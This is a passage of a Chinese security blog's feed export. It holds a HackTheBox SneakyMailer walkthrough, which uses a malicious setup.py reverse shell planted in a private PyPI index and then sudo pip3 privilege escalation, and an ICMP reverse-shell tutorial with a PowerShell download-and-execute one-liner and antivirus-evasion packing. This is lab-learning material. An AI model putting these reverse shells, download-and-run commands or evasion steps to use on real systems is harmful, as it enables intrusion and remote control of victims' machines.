<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">firstName&#x3D;Paul</span><br><span class="line">lastName&#x3D;Byrd</span><br><span class="line">user&#x3D;paulbyrd</span><br><span class="line">email&#x3D;paulbyrd@sneakymailer.htb</span><br><span class="line">password&#x3D;^(#J@SkFv2[%KhIxKk(Ju&#96;hqcHl&lt;:Ht</span><br><span class="line">rpassword&#x3D;^(#J@SkFv2[%KhIxKk(Ju&#96;hqcHl&lt;:Ht</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201126163624437.png" alt="image-20201126163624437"></p>
<p>在邮件中找到一个账号密码，从另外一封邮件，我们得知这个服务器上面有<code>pypi</code>服务。。并且low这人要安装测试。。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201127003522512.png" alt="image-20201127003522512"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Username: developer</span><br><span class="line"></span><br><span class="line">Original-Password: m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]C</span><br></pre></td></tr></table></figure>

<h3 id="ftp-获取立足点"><a href="#ftp-获取立足点" class="headerlink" title="ftp 获取立足点"></a>ftp 获取立足点</h3><p>用邮件拿到的凭证测试之后能登陆ftp，但是不能登陆ssh。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201126163828723.png" alt="image-20201126163828723"></p>
<p>看起来是dev子域名的根目录，不过没关系。我们可以直接传shell了，</p>
<p><img src="https://images.atsud0.me/images/post/image-20201126165246450.png" alt="image-20201126165246450"></p>
<p><img src="https://images.atsud0.me/images/post/image-20201126165300195.png" alt="image-20201126165300195"></p>
<p>这靶机也是有脚本自动恢复环境的。所以上传之后要尽快getshell</p>
<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>用以下代码打开一个pty</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>

<p>用邮箱找到的密码能切换用户。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201126193419030.png" alt="image-20201126193419030"></p>
<p>接着在<code>/var/www/</code>下发现一个新的网站目录，子域名，并且在里面的<code>.htpasswd</code>看到了一个账号。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201126165652845.png" alt="image-20201126165652845"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR&#x2F;p&#x2F;</span><br></pre></td></tr></table></figure>

<p>用<code>john</code>爆破就好了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt pypi.apr</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201126170758163.png" alt="image-20201126170758163"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pypi:soufianeelhaoui</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201126174244372.png" alt="image-20201126174244372"></p>
<p>尝试访问下5000端口的服务。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;</span><br></pre></td></tr></table></figure>

<p>5000端口上的服务就是目标私有pypi源服务。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201126182702581.png" alt="image-20201126182702581"></p>
<p>访问看看有什么包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;simple&#x2F; -u &quot;pypi:soufianeelhaoui&quot;</span><br><span class="line"></span><br><span class="line">curl -v http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;packages&#x2F; -u &quot;pypi:soufianeelhaoui&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201126183059194.png" alt="image-20201126183059194"></p>
<p>两个目录都是空的。邮件里面说<code>low</code>用户要对<code>pypi</code>模块进行测试，安装。所以猜测有个定时任务或者后台程序之类的东西。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -ef|grep low</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">low       1071     1  0 07:58 ?        00:00:06 &#x2F;home&#x2F;low&#x2F;venv&#x2F;bin&#x2F;python &#x2F;opt&#x2F;scripts&#x2F;low&#x2F;install-modules.py</span><br></pre></td></tr></table></figure>

<p>果然。。有个安装模块的脚本。不过看不了源码，目录权限写死了。</p>
<h3 id="上传py模块包-提权-low"><a href="#上传py模块包-提权-low" class="headerlink" title="上传py模块包-提权 low"></a>上传py模块包-提权 low</h3><p>然后两个标准的文件<code>.pypirc</code>和<code>setup.py</code></p>
<p>.pypirc文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[distutils]</span><br><span class="line">index-servers &#x3D; local </span><br><span class="line"></span><br><span class="line">[local]</span><br><span class="line">repository: http:&#x2F;&#x2F;localhost:5000 </span><br><span class="line">username: pypi</span><br><span class="line">password: soufianeelhaoui</span><br></pre></td></tr></table></figure>

<p>恶意setup.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup, find_packages</span><br><span class="line"><span class="keyword">import</span> os,socket,subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=os.system(<span class="string">'cat /home/low/user.txt'</span>)</span><br><span class="line"><span class="comment"># 这里要做个判断，要不然一上传就弹个www-data的shell回来</span></span><br><span class="line"><span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">'Your IP'</span>,<span class="number">8888</span>))</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">    p=subprocess.call([<span class="string">'/bin/bash'</span>,<span class="string">'-i'</span>])</span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">    name=<span class="string">'test'</span>,</span><br><span class="line">    version=<span class="string">'0.0.1'</span>,</span><br><span class="line">    author=<span class="string">'atsud0'</span>,</span><br><span class="line">    license=<span class="string">'MIT'</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>在执行上传之前，先修改下当前用户的家目录，改成.pypirc所在的目录。为什么要修改呢，就如前面说所这个文件默认就是在家目录，不管是<code>www-data</code>用户还是<code>dev</code>用户，他们的家目录都在<code>/var/www</code>下，他们还没创建文件的权限。所以改个环境变量到tmp下再创建。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $HOME</span><br><span class="line">export HOME&#x3D;&#x2F;tmp&#x2F;project</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201127001801966.png" alt="image-20201127001801966"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 setup.py sdist register -r local upload -r local</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201127001702883.png" alt="image-20201127001702883"></p>
<h3 id="提权至root"><a href="#提权至root" class="headerlink" title="提权至root"></a>提权至root</h3><p><img src="https://images.atsud0.me/images/post/image-20201126225658727.png" alt="image-20201126225658727"></p>
<p>已经成功越权到low用户了，再次执行下信息收集脚本。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201126230618077.png" alt="image-20201126230618077"></p>
<p>能<code>sudo pip3</code>。。最喜欢这种了。。不过我一开是用GTFOBins给的提权命令，但是不能成功。（不过如果先开个python pty的话就可以成功。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TF&#x3D;$(mktemp -d)</span><br><span class="line">echo &quot;import os; os.execl(&#39;&#x2F;bin&#x2F;sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&quot; &gt; $TF&#x2F;setup.py</span><br><span class="line">sudo pip3 install $TF</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201127003306173.png" alt="image-20201127003306173"></p>
<p>然后用回了一开始越权到low用户的setup.py脚本改了下端口。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pip3 install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201127000833982.png" alt="image-20201127000833982"></p>
<p>R O O T E D !</p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>难，是真的难。如果没有接触过pypi的话，是真的麻烦。一开始的邮件钓鱼，也是很秀。万万没想到，拿立足点竟然比root还要难。不过在这个靶机也学到了很多，比如怎么上传py包到pypi源，简单的钓鱼邮件利用，收获还是很多的，文章中可能有许多错误或语法不通顺的地方，还请各位大佬多多谅解，有什么问题欢迎私信找我交流。</p>
<p>参考文章：</p>
<ul>
<li><a href="https://blog.csdn.net/weixin_39219503/article/details/103643446" target="_blank" rel="noopener">python pip提权</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/pip/" target="_blank" rel="noopener">GTFOBins-pip3</a></li>
<li><a href="https://docs.python.org/2/distutils/setupscript.html" target="_blank" rel="noopener">Writing the setup script</a></li>
<li><a href="https://pypi.org/project/pypiserver/" target="_blank" rel="noopener">pypiserver</a></li>
<li><a href="https://packaging.python.org/guides/migrating-to-pypi-org/#uploading" target="_blank" rel="noopener">Publishing releases</a></li>
</ul>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Phishing_email</tag>
        <tag>GTFOBins-pip</tag>
        <tag>pypi</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-Worker</title>
    <url>/2021/01/17/HackTheBox-Worker/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="活跃机器，只做记录，如果需要提示，请邮件联系，忘记看管理员hash了。。。。" /><label>活跃机器，只做记录，如果需要提示，请邮件联系，忘记看管理员hash了。。。。</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="a21ee7dace9ce902649eec3906c71e1fd573aad2710c4c74c4f742267262a8eb"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>靶机实验</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>Azure Devops</tag>
        <tag>Svn</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox邀请码</title>
    <url>/2020/05/18/HackTheBox%E9%82%80%E8%AF%B7%E7%A0%81/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="这里输入密码。" /><label>这里输入密码。</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="6d0feab59c62566e9d2547b621cdd31167d19fe21118b5b7897759155c4b609c">998901b35485f382598118f4fa31c1937e2f2f437af450e04aa71c091e54c5677a9b404329ebffd6bbcf2b86047fd9dad8acb680f3402bd28568eb2d2e06ed43ebcb93e318d136f354becaa5b16b5ec1110671075dd140199322feb45f36d3ba10092c60775e66da02da0256df2e8b26cbdaefebb3a16793983073cd12cb8c879342f27d3356c3c95d66ca41a5e2e370a56f1c0d5c2bbd55343c308edcb2472ed1a8f887697cfe2b3d2e37642877a0887135037058146af32b1f84747c58e9408364048fc140bc8dffb736772c05aee46b78d2c3f87251c61afa5361200308af98572a336f8699e704511ff9827cbd964cb5355d2930b96019849a083bd73cae1467e440499a07c384133a0a6b5a0a4495127f7dc0c3ae54a5099c9e7f5d7db1d6b06f68a384db987c305081e96d3c5885ec5fa1af08880078ff170768902aab5de971bc5b80984574f186e5f746f02bde6271104e05fd03784b4fe8f145b333d9590e49f0154e4bd4a2230c8e7f33dcb3c83c17947ef9b228f33f4990d82ffc5043498d42b571500b723da27bc5b1f60315176864f60bc5955d5a3604128e7d78432c0056f4f65d43ff039990a5585d8dfe20f3e47014c2d87d048be422107a9130e7f2221726a217810285464618e7be661c6cb9170ed7ff552121d8e1441d795467aeeb783e95b47fd42ade2d4a4df1417ad7b9939332e7a83e3e87e53afb8f08d4e41c9c24401fb46b566380af4eeaf18da7023493140eceafd2d2aed13c8c0244b34f6ada03b1cbc26e9127980d53a476f18385cb002595a3e1450f2d0b392b8418233f9204ada94e8b0c80d093f1d7697227927e285c576049434a8e3a88c7039485df2d2a0b8279bf5c27b6f6ef68c4ff675527f8f49757d3a5bf8262e7fd9d03f1ad8f396210ff0fced64cd04be754e82aef17f78f315801375544cc57c5d99ffb041686d8bb84f731292cb8aa4c3f92a1ad697f1ee9d3664b14fdcce3bdf7c2d554a0f152a9a34bcf1ed7ca5b9a8c13c4833c63e2e60e1a916d1cea97b7c6b9892e5fd57507f708f5aafaad01c0f049634bc1f3135ab87d431a2367c10d4d25eb63dcdc34024ae987eed6b4d7c8b220c4a59f9fb59c38df2474b9ecd4629f442be93febd0628759ac31916d7bbafe89e990a03f09ab3aa5174faf294ccfac8e7e15d36bcd3583d30093a9bd85374ec4045c5f3e14a77016a3ba5656f14ff514c3d982cf9ee886e2e2372019b2bc1f09628dbc0d485060fce6be6cb5961e8da4bd587c2248eb94b20ecb85909123008b31a58a8fbb2ea973b6f1b659c7d9e645f39b93f3ce6d0d6e430800498ded8c0408cb1cfb95678b490a20d1320c11f4c9b97796e442c9121586cfe714006939253d13c00b81417c96c11d5df6430833ca213d32ad76347d9fbca0925a6d5059d53a20f19c3e57de6a4047fb03eefa3b3b9ffc418b122f0b99a4747f0020306fb41e2fcdcb64293d61979243ddbe26446833fc7a63a17d3fe967396fe0dee880f0b68e559ac549388d929ae1dc74ecfd608552802106798726a540c731336d8f402302a06da9a02023946b07cfa795d4907ba60eff4b8436bc2b6337e60690a64c227bcd15f5fd9e0750ef4a48c05a8aeb92c064474b38a76f55be4be8c8bc054eda1d9efcb9b40be129a5837f043c162a92b21a9de185a0ca4efd15a8c9265b37f9039c73dca4e809fd422ab2b28c6a8f07f7a58ef42ccb52b1a33ab7363bb269547ea38b098848560f44ea934e74ad94b5379b59894f062fa1dbea3c47093a9ce578958ddeb8367db44c5e0528bbe62bdb9da52e374586d8bb62837c8c865f9c8d15226ee39669b7631bc8cdc1cb1064c5d2ddfdbb0559e3178b2c6cd3390963b112f349994badcca07c74dcbb7ff1746aca7517f989b8931499348a77bc31df9b93698004bb039a80c2525ea2d8306712badf8eac739a7e76cfcbbe2988c4afda125672b7219cb7d1d41b0c3e81826f5cf0f7ea8dd16d16f77fcba60350775581709f5166addf3d13bd4f178e3a905dfa3b5e2311296dd60dfa021cfcc66d253de0963a748c482282745af12ec65767fda5d51ec988f5198541134024f92e5de589879f2c9269dc2fd1abc28d476947bae8e75ab0de66ff0ec36a6f42debdbe1660f40bfae389e95f70ad59073eda2c02ec8594557e0978a566e6da7e8861746a1c04481d9a1612b934923299a9bda0f82ef71423606900544db1f3f1fdb18f82bd04174108481efb4b235b14605f8f355000fb047122a51a465e0208f7b1c5ea4401cf774c1403c249cb04992ec503effcd9079ee37a0c5c2b028b35c0a00b94927f1332d9d969a505564d1fe8e918426301634d9c526cb3611f5ae206e1517d87f15e68d54b85a90769db280ed0e79c522d117ca65c6a8812e013f40f0b636c0f3a59f7e1ed93a04bfdab5152e9fdaec51eda7619d8909014596b14f4d05cde2c09496303a1e9f6352c2b33ff067d4c08824895b984b3de1de1f1ac206894df2d8c1afefb26d79daf470998238ad80a617edd80c26fe8b6b2a0fc9e9a1b7f3f205221405a5feb91a855e74b8de87342feed384914a02ba1f9f7cdc03f689fc415f451e1bb4e98b50f2ead835344a0159e31ba824dc7097919aa3de1de927a62ad009f3aa853a7b1a99a6b83bf015d9f6edbf951ea05a4ee05226557874076e4558f7d4a9a42c44ad1076a5928f03d293725e17d48b6f8a51604fdac8f4b0630c73a2168073ae42ee871520e8a418de36a99997072e81ffb530f90489f4c908182d42ab18cf5be9634319e40d78b7d74eb927010ea4a7b5ac40b5a64a2130b8b912dd92b0bf7953bbd5463c2dc6aec393f8485a6cde57f9ce122a36a7d8a20e227a1c30da6d74d330d9b980d128252d44ba9e89ab4e0f9f33a8c12089c844bb8b7c78289619a36b384efec9a9236554f28d2bc971d30da77baad8077afe7cb731126a6b3763ba0ff1c02a24d7a22c6b8091d4ef7e0f120921055dbe637e7b5a3ac859db2495a1e8e5c2e89971704610e09719b58c04141a2939d17fe48bac0cb81a3bb5d5e12d22a534996f49c26ab52d78a4f1bb12744f25fa1c48f3332582f161006c68565944cceef4a4b7d146642bdb770c117bb26555bdf24761b11a87b93c6e8bc1babe8a3b291330466864a82b77940987833ee79913bac1c8668022a75279862980cee91883c2f97ad769be520551f349442d6212461d13b427cbba4038d449610301311e66ae79f2c0043afb9bf1da91dc1736e67fa2ba928b7d76bf42a2de92479634331ad7bef2f716c2bcfd71d223aae534f7a9940b3356a586d0bd3104d7287bdc4b5d0a2c29f11d38d188bba5b7754eccf78febc92eb686a169f486942d0d4f70055a423ba41e364859a573f236207dd73e84f30bc8382a4582d826d275dc33557dd62fd51cea825e42199e9251ed191885257a9b523d1d3bf049482e2ad55a90c9131552e07d8e21dcd7d1a0c374b283e67479330e5ade0c31fc510a6bb8b2c42950fb8157b46993ac49ba605f5fe1de027189d1d79732ce0d5e54d3b85c6460e7079cd1d3d15f1422dcf55da0f553b081d9e4014c282dd504f86b7623bf980478fdc7d3e9e017a2f8a1ddd04d4bf5b7135d43ab1d2e3cff136081bcee6eaf45a7e53e3c600ad99987de4f25c5f24ca504cc1c0bc7ee02ef99605fde60b689aa093805483a0a4c689c4f568c45a1bb78d15148a8f898ce2b2dcb20ac36eda997b9ed435a22701ebac7e3bb150ff0328dca7b651d879319a47e9805a015c255c4bf642a162dc3288abd2b00c0cff20b80356b56e661a4dd9ad8c4d1310d734198f0e05cd682c5d0454f09a8a3f4e32d0e703d1c4350174b100b8b1f2b0a89aa6f8ede6e0ea477c9cf383585cc8c5eeab634aaf5361605f85074df53d1248b80e3aa01a5ec6e9320d2ec2633113bc678ed3ebd6ae66e970e006a0103d44f8fe5b15c557184d89d9467d3a71b0252d853ebe7072ce2901abba59acc21fca6b75d04acddc5166aea0fb3bde916c29a627f8998ae0a426333f8f1c4c2d0239a780ab69b44e7ffa59023797e59c28a686fed6ae354e2cbb919c83ecbf345c1ac1c388c8f5c350f8ae566e991666c6c63ed8e1c7353b31cac018ee148f2e1a65435c9a90c4d9a9092b3313e0ce560b73e1bcf95dac30c6f6a7ff7a229526247946918f4e32d54b3752744f967e225cc84a974e99056ab69b14bf7b4b1eeb328e655031fa60db2c7008db575a391e1a3f3624469d95b0dab95808efdaa85aec298d0a9403e3406f17cc6c09bb1b33fb5e50c95999efca94dcb5495ec399a398753483ac361c3746d859358ec5ce099e6baea8dc3ca7bb416c47140f58295721db4f98018416375e47f49798e72b435b89b8c07a02e8f346ea05e15d7bfcb92c3ad46bfa8cf28f7586d093c914d5f1604c781e62215db961dd837813c4849e1edec60c00f7b1050cb1cda5058ee0c07e75caf83273137cf294af8f9858aeba32c32f5940b58e7dd168e225704cecc4a32fc0de86e339f9b409f925a1a82f093a0d7b732763fbc38829d52e8790f10377dc247141fc743284891b34fc2307645cf0b77a1d87318989e945be7a76b41dba48c9b25902497dcd4fb81e96bfba6de1039d0f650ee416ca379f0757d1ce165ce202b42481801c2f931e5660658d73f010761d4d230f6de682fcc9cc0c95cceb1f56960286a7891b30bbdc01f6db79a4ccecddf87f08bfd420a49cac573a4bc6c65da2e5124a96408e573e27b7d58550c01520b2e236602b58e0a381376b5c1a553a3e408e4b4f202b153fc9e4316ff89012473603a41327d0df0e577c795c267a9d7feea59b931d006acccd8442019f350efd8c30feefcdf23a411ff5b3a2130b362a2537cbda4dd33c724054f04d796d2d93ddee7cf2a02505d50453b7c258dee3f584174122c936962307701d05b172a365e25c77549e9f0dccb0ac5bad1bc7506c74ccabe851beb494790530961b9a194937ea2d96c8769b833a3826c315e3280a355db46580c5bddeffa051c4d05a1ab339b6d89b417fea16b20748e161be9b48646eeba2c3da230d8a2ddd24b3795d7630e11178f11ad0de8fe01af86dfd207a66076a40705d379096ab50587d24f5dd7203f6dea8b3e46a85c6a61e6b032c4e12ed83b44a0c1bbbb57a642e45f42e621542ce6e1ddcab3f6567302b1ac1e89b900b6cabdc</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>靶机实验</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
      </tags>
  </entry>
  <entry>
    <title>ICMP-Shell</title>
    <url>/2020/11/01/ICMP-Shell/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>Windows和Linux下建立基于ICMP下的reverse shell方法。</p>
<a id="more"></a>

<h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h2><p>先下载<a href="https://github.com/inquisb/icmpsh.git" target="_blank" rel="noopener">项目</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh.git &#x2F;opt&#x2F;icmp_reverse_shell</span><br></pre></td></tr></table></figure>

<p>Kali预装了<code>python2</code>和<code>python3</code>，但是却不预装<code>pip</code>。。加上pip2已经被移除官方源，所以只能通过<code>get-pip.py</code>来安装。</p>
<p>python2-pip&amp;pip2-impacket安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/2.6/get-pip.py</span><br><span class="line">python2 get-pip.py</span><br><span class="line"></span><br><span class="line">pip2 -V</span><br><span class="line"></span><br><span class="line">pip2 install --upgrade pip</span><br><span class="line"></span><br><span class="line">pip2 install impacket</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201101142913021.png" alt="image-20201101142913021"></p>
<p>这样就算是监听起来了。</p>
<p>这里输入的ip，是要公网地址，或者是内网地址。所以受害者必须要有一个公网ip地址，能让icmp包直达，或者是你在内网里，用跳板机起的监听。</p>
<h2 id="0x02-实验"><a href="#0x02-实验" class="headerlink" title="0x02 实验"></a>0x02 实验</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>但是，不成功在<code>Windows10</code>下使用脚本给出的</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">icmpsh.exe -t <span class="number">192</span>.<span class="number">168</span>.<span class="number">179</span>.<span class="number">128</span> -d <span class="number">500</span> -v <span class="number">30</span> -s <span class="number">128</span></span><br></pre></td></tr></table></figure>

<p>并没有像文章<a href="https://www.freebuf.com/articles/system/50361.html" target="_blank" rel="noopener">剑走偏锋：细数Shell那些事</a>作者<code>xia0k</code>那样直接返回一个<code>shell</code>。<code>Win10</code>下运行什么反应都没。。(待后续继续尝试)</p>
<p>换<code>windows server 2012</code>。好家伙，有反应了。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201101143251260.png" alt="image-20201101143251260"></p>
<p>因为是走icmp，所以在windows下使用<code>netstat -ant</code>命令是看不到有外连ip的。只能从进程中看到</p>
<p><img src="https://images.atsud0.me/images/post/image-20201101143425591.png" alt="image-20201101143425591"></p>
<p>这程序也是会报毒的，所以要自己做下免杀才行。但实际上对源码不做改动，刚编译出来拿去跑<a href="http://www.virustotal.com" target="_blank" rel="noopener">virustotal.com</a>国内大部分杀毒都没识别到呢</p>
<p><img src="https://images.atsud0.me/images/post/image-20201101151107570.png" alt="image-20201101151107570"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Linux编译</span></span><br><span class="line"></span><br><span class="line">apt install gcc-mingw-w64</span><br><span class="line"></span><br><span class="line">i686-w64-mingw32-gcc-win32 icmpsh-s.c -o abc.exe</span><br><span class="line"></span><br><span class="line">upx -v abc.exe -o abc-slave.exe</span><br></pre></td></tr></table></figure>



<h3 id="powershell-reverse-icmp-shell"><a href="#powershell-reverse-icmp-shell" class="headerlink" title="powershell reverse icmp shell"></a>powershell reverse icmp shell</h3><p><code>Windows</code> 下也可以去用<a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1" target="_blank" rel="noopener">powershell</a>滴。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com</span></span><br><span class="line"><span class="string">/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'</span>);</span><br><span class="line"><span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">159.134</span> <span class="literal">-port</span> <span class="number">6666</span></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201101153255502.png" alt="image-20201101153255502"></p>
<p><img src="https://images.atsud0.me/images/post/image-20201101153344176.png" alt="image-20201101153344176"></p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>在<code>Google</code>找到以下文章，可能是<code>icmp-shell</code>的Linux版 : <a href="https://medium.com/@int0x33/day-20-ping-pwn-icmp-shell-for-linux-using-icmp-tunnels-2bab37eda271" target="_blank" rel="noopener">ping-pwn — Writing an ICMP Shell for Linux using ICMP tunnels &amp; Scapy</a></p>
<p>但是呢，即使是在root用户下运行也提示。。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201101152216441.png" alt="image-20201101152216441"></p>
<p>经过Google，我发现[<a href="https://github.com/bgylde/PingForAndroid/issues/1]这里给出了一个解决方案" target="_blank" rel="noopener">https://github.com/bgylde/PingForAndroid/issues/1]这里给出了一个解决方案</a></p>
<blockquote>
<p>Have a try for socket(AF_INET, SOCK_RAW, IPPROTO_ICMP). You need to assemble the ICMP package yourself.</p>
</blockquote>
<p>改动了一下代码后，脚本确实能起来了。但是执行的结果是啥我也不知道。。看上去是没有正确的将执行结果发回来</p>
<p><img src="https://images.atsud0.me/images/post/image-20201101161706406.png" alt="image-20201101161706406"></p>
<h3 id="ish"><a href="#ish" class="headerlink" title="ish"></a><a href="http://icmpshell.sourceforge.net/" target="_blank" rel="noopener">ish</a></h3><p>相比上面那两个脚本，ish更为简单易用，，不过要注意的是这个<code>ish</code>是<code>bind shell</code>。并不是<code>reverse shell</code>。</p>
<p>安装并编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://nchc.dl.sourceforge.net/project/icmpshell/ish/v0.2/ish-v0.2.tar.gz</span><br><span class="line">tar zxvf ish-v0.2.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ISHELL-v0.2/</span><br><span class="line">make linux</span><br></pre></td></tr></table></figure>

<p>被控端执行 ishd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;ishd -i 65535 -t 0 -p 1024</span><br></pre></td></tr></table></figure>

<p>控制端执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo .&#x2F;ish -i 65535 -t 0 -p 1024 192.168.179.128</span><br></pre></td></tr></table></figure>

<p>这里的<code>sessions id</code>要对应，即<code>-i</code>参数控制端和被控制端要一致。</p>
<p>更坑的是，<code>ishd</code>不管你执行成不成功都不会有任何回显信息，只能通过<code>ps</code>来查看进程到底有没有在运行，即使运行了也可能会有种种原因，导致控制的无法连接。。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201101163826019.png" alt="image-20201101163826019"></p>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>现阶段，就Windows的ICMP Reverse Shell 来说成熟。Linux的就。。。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://www.freebuf.com/articles/system/50361.html" target="_blank" rel="noopener">剑走偏锋：细数Shell那些事</a></li>
<li><a href="https://medium.com/@int0x33/day-20-ping-pwn-icmp-shell-for-linux-using-icmp-tunnels-2bab37eda271" target="_blank" rel="noopener">ping-pwn — Writing an ICMP Shell for Linux using ICMP tunnels &amp; Scapy</a></li>
<li><a href="https://lilydjwg.is-programmer.com/2013/10/29/non-privileged-icmp-ping.41390.html" target="_blank" rel="noopener">不需要 root 权限的 ICMP ping-依云</a></li>
<li><a href="[https://github.com/bgylde/PingForAndroid/issues/1]">IPPROTO_ICMP Permission denied</a></li>
<li><a href="http://www.361way.com/linux-icmp-shell-ish/3284.html" target="_blank" rel="noopener">linux下一个ICMP shell（backdoor）</a></li>
<li><a href="https://www.anquanke.com/post/id/99793#h2-4" target="_blank" rel="noopener">powershell反弹shell的常见方式</a></li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Windows</tag>
